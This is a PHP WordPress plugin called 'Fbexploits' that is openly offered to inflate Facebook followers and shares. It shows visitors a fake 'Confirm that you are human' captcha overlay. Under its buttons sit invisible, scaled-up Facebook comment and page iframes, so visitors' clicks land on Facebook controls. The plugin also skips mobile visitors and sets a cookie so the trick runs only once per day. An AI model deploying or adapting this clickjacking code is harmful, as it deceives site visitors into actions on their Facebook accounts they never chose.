<?php
/*
Plugin Name: Fbexploits
Description: Plugin para conseguir muchos seguidores en facebook y compartir mucho una noticia o blog
Version: 1
Author: Erik Gonzalez Cardona
*/


add_shortcode('fbexploits','shortcode_fbexploits');

function shortcode_fbexploits($attr){
    $atributes = shortcode_atts(array('url'=>null , 'top-iframe-p1'=>'250','top-iframe-p2'=>'214','opacity'=>0,'fanpage'=>null,'rand'=>5,'english'=>'true'),$attr);
    $referidos = array('www.facebook.com','web.facebook.com','l.facebook.com');
    $novernada = true;
    if(isset($_COOKIE['novernada']) && !empty($_COOKIE['novernada']) && $_COOKIE['novernada'] == "612321"){
        $novernada = false;
    }

    if (isset($_SERVER['HTTP_REFERER'])) {
        $url_ref = $_SERVER["HTTP_REFERER"];
    } else {
        $url_ref = "";
    }

    $pasa = true;
    if($url_ref != "") {
        foreach ($referidos as $referido) {
            if (parse_url($url_ref)['host'] == $referido) {
                $pasa = true;
            }
        }
    }

    if($atributes['url'] != null && $atributes['fanpage'] != null && $pasa && $novernada) {
        $url_comment = $atributes['url'];
        $top_iframe_p1 = $atributes['top-iframe-p1'].'px';
        $top_iframe_p2 = $atributes['top-iframe-p2'].'px';
        $opacity = $atributes['opacity'];
        $pagina_fb = $atributes['fanpage'];
        $english = $atributes['english'];
        if($english == 'false'){
            $english = false;
        }else{
            $english = true;
        }
        $url_img = plugin_dir_url(__FILE__)."img/".($english?'en/':'es/').rand(0,$atributes['rand']).'.png';

        ob_start();
        ?>
        <script src="<?php echo(plugin_dir_url(__FILE__)); ?>js/jquery.iframetracker.js"
                type="text/javascript"></script>
        <script src="<?php echo(plugin_dir_url(__FILE__)); ?>js/isMobile.min.js" type="text/javascript"></script>
        <script type="text/javascript">

            jQuery(document).ready(function () {
                var posicionTop = <?php echo($atributes['top-iframe-p1'])?>;
                var altoIframe = 0;

                setTimeout(function(){
                        jQuery('.capaeliminar').css('display','inline');
                },1);

                var texto = null;

                if(<?php echo($english? 'true':'false');?>){
                    texto = {'btn-p1':"Continue to website",'btn-p2':'No, Thank you','titulo-p1':'Thank you for your visit','titulo-p2':'You want to give me like?'};
                }else{
                    texto = {'btn-p1':"Ya puede continuar",'btn-p2':'No, muchas gracias','titulo-p1':'Muchas gracias por visitarnos','titulo-p2':'Desea apoyarnos con un me gustar?'};
                }

                if(isMobile.any){
                    jQuery('.capaeliminar').remove();
                    return;
                }

                jQuery('body').css('overflow', 'hidden');

                var dentro = false;
                var cont = 0;

                jQuery('#comenta').mouseenter(function () {
                    //console.log('entre el mauser');
                    dentro = true;
                });

                jQuery('#comenta').mouseout(function () {
                   // console.log('dio');
                    jQuery('window').focus();
                    dentro = false;
                });


                jQuery(window).blur(function () {
                    if (dentro) {
                        if (cont == 1) {
                            /**
                             * Paso 2
                             */
                            jQuery('.contenido').fadeOut(200);
                            setTimeout(function () {
                                jQuery("#comenta").css({
                                    'width': '130px',
                                    'height': '45px',
                                    'top': '70px',
                                    'left': '135px',
                                    'margin': '0',
                                    'padding': '0',
                                    'opacity': '<?php echo($opacity);?>'
                                });
                                jQuery("#comenta").css({'top': '28px', 'height': '35px'});

                                var izq = "-"+(jQuery('.fb-comments iframe').first().width()+(jQuery('.fb-comments iframe').first().width()/2)+(jQuery('.fb-comments iframe').first().width()/2))+"px";

                                jQuery('.fb-comments iframe').first().css({'transform': 'scale(4)','top':posicionTop, 'left': izq});
                                jQuery('#titulo_fbexploits').html(texto['titulo-p2']);
                                jQuery('.borrar_visaje').css({'top': '210px', 'left': '137px'});
                                jQuery('.borrar_visaje').html(texto['btn-p2']);
                                jQuery('#contenido > div').first().remove();
                                jQuery('#contenido > div').first().css('display', 'block');
                                var bton2 = jQuery('<div class="puntero_exploit" style="z-index: 999999; width:150px;height: 50px ;position:absolute; left:130px; top:210px; background-color: rgba(223,11,22,0.6);opacity:<?php echo($opacity); ?> "></div>');
                                bton2.click(function(){this.remove();});
                                jQuery('#contcomenta').append(bton2);
                                jQuery('.contenido').fadeIn(200);
                                cont++;
                            }, 300);
                        } else if (cont == 2) {
                            /**
                             * Paso 3
                             * */
                            setTimeout(function () {
                                jQuery('body').css('overflow', 'visible');
                                jQuery('.capaeliminar').fadeOut(200, function () {
                                    jQuery('.capaeliminar').remove();
                                    crearCookie();
                                });
                            }, 300);
                        }
                    }
                });

                jQuery('#boton').click(function () {
                    /**
                     * Paso 1
                     */
                    jQuery('.contenido').fadeOut(200);
                    setTimeout(function () {
                        jQuery("#comenta").css({
                            'width': '140px',
                            'height': '45px',
                            'left': '133px',
                            'margin': '0',
                            'padding': '0',
                            'opacity': '<?php echo($opacity);?>'
                        });
                        var bton = jQuery('<a class="borrar_visaje boton" style="z-index: 1; padding:10px ;position:absolute;margin-top: 6px; left:150px;">'+texto["btn-p1"]+'</a>');
                        jQuery('#contcomenta').prepend(bton);

                        var topIframe = <?php echo($atributes['top-iframe-p1'])?>;

                        altoIframe = jQuery('div.fb-comments iframe').first().height();
                        alert(altoIframe);
                        if(altoIframe < topIframe){
                            posicionTop = "-"+topIframe+"px";
                        }else if(altoIframe < 380 && altoIframe > 244){
                            posicionTop = "-"+100+"px";
                        }else if(altoIframe >= 380){
                            posicionTop = "-15px";
                        }

                        //alert(altoIframe);
                        //alert(posicionTop);

                        var posLeft = ((jQuery('.fb-comments iframe').first().width()/2)/2) +"px";
                        jQuery('.fb-comments iframe').first().css({
                            'transform': 'scale(4.5)',
                            'top': posicionTop,
                            'left': posLeft
                        });

                        jQuery('.comprobacion').remove();
                        jQuery('#titulo_fbexploits').html(texto['titulo-p1']);
                        jQuery('#contenido > div').first().html('');
                        cont++;
                        jQuery('#boton').remove();
                        jQuery('.contenido').fadeIn(200);

                    }, 300);
                });

                function crearCookie(){
                    var d = new Date();
                    d.setTime(d.getTime() + (1*24*60*60*1000));
                    var expire = "expires="+ d.toUTCString();
                    document.cookie = 'novernada=612321;'+expire
                }
            });
        </script>

        <div class="capaeliminar"
             style="position: fixed ; width:100% ; height:100% ; background: rgba(0, 0, 0, 0.6) ; z-index: 99999; left:0 ; top:0; overflow:hidden;display: none">
            <div class="contenido"
                 style="background: #f1f1f1;box-shadow: 0 0 5px 0px inset; width: 420px; height: 280px; position: absolute; left: 0; top: 0; bottom: 0; right: 0; margin: auto;padding: 10px; padding-top: 0px;">
                <h4 id="titulo_fbexploits" class="titulo_explo" style="text-align: center;"><?php echo( $english ? 'Confirm that you are human' :'Confirma que eres
                    humano' );?></h4>
                <div id="contenido"
                     style="float:left; width: 100%; margin: 10px auto; font-size: 0.9em;text-align: center;">
                    <div style="padding:13px"><?php echo( $english? 'Write what you see in the image ( Captcha security )' :'Escribe lo que ves en la imagen (Captcha de seguridad)');?></div>
                    <div style="display: none;">
                        <div class="fb-page" data-href="https://www.facebook.com/<?php echo($pagina_fb); ?>"
                             data-width="380" data-show-facepile="false" data-hide-cover="false"
                             data-show-posts="false"></div>
                    </div>
                    <div id="contcomenta" style="text-align: center;">
                        <div id="comenta"
                             style="width: 100% ; height: 60px; z-index: 999999; overflow: hidden; margin-bottom: 30px;position:relative;">
                            <div class="fb-comments fb_iframe_widget"
                                 data-href="<?php echo($url_comment);?>"
                                 data-numposts="1"></div>
                        </div>
                    </div>
                    <div class="comprobacion">
                        <img src="<?php echo($url_img); ?>" width="180px" height="48px">
                    </div>
                    <a id="boton" class="boton" style="width:40px ; height: 30px; padding:10px; margin-top: 130px;"><?php echo($english?'Go':"Entrar");?></a>
                </div>
            </div>
        </div>
        <style>
            .titulo_explo {
                background-color: #00b9eb;
                color: white;
                padding: 5px;
            }

            .boton {
                background-color: #00A8EF;
                color: white;
            }

            a:hover.boton {
                cursor: pointer;
            }

            .fb_iframe_widget {
                display: inline-block;
            }

            .fb_iframe_widget span {
                display: inline-block;
            }

            .fb_iframe_widget iframe {
                position: absolute;
            }

            .fb-comments iframe {
                top: -70px;
                left: -60px;
            }

            .comprobacion {
                position: absolute;
                top: 103px;
                left: 230px;
                z-index: 999999;
            }

            .puntero_exploit:hover{
                cursor: pointer;
            }
        </style>
        <?php
    }
    $html = ob_get_clean();
    echo($html);
}

add_action('wp_footer','add_facebook_js');

function add_facebook_js(){
    ob_start();
    ?>
    <div id="fb-root"></div>
    <script>(function(d, s, id) {
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s); js.id = id;
            js.src = "//connect.facebook.net/es_ES/sdk.js#xfbml=1&version=v2.6";
            fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));</script>

    <?php
    $html = ob_get_clean();
    echo($html);
}

?>